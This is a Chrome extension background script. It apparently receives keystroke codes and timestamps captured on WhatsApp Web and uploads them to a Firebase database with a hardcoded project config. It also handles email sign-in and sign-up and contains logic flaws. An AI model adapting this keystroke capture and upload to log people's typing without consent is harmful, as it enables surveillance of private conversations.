// Upload Data to firebase database

const WHATSAPP_WEB = "https://web.whatsapp.com/"
const SIGN_IN_ACTION = "SIGNIN"
const SIGN_UP_ACTION = "SIGNUP"

const config = {
    apiKey: "AIzaSyABnZ9KDeJiJxqswHy7rJqVhP5Qu5DOxRo",
    authDomain: "anona-dd0ad.firebaseapp.com",
    databaseURL: "https://anona-dd0ad.firebaseio.com",
    projectId: "anona-dd0ad",
    storageBucket: "anona-dd0ad.appspot.com",
    messagingSenderId: "126637111077"
  };

const FIREBASEANONA = firebase.initializeApp(config);

function writeClientData(key, time) {
    FIREBASEANONA.database().ref().set({
        keyCode: key,
        timeStamp: time
    })
}

function checkUserExistance(userName) {
    
}

function onSignIn(request){
	firebase.auth().signInWithEmailAndPassword(request.email, request.password);
}

function onSignUp(request){
	firebase.auth().createUserWithEmailAndPassword(request.email, request.password);
}

function onMessage(request, sender){
	if(sender.url == WHATSAPP_WEB && isSignedIn){
		console.log(request.key + "- " + request.time);
		writeClientData(request.key, request.time);
	}
	else{
		if(request.action == SIGN_IN_ACTION){
		    isSignedIn = true;
			onSignIn(request);
		}
		if(request.action == SIGN_UP_ACTION){
		    isSignedIn = true;
			onSignUp(request)
		}
		
	}
}

var isSignedIn = false

chrome.runtime.onMessage.addListener(onMessage);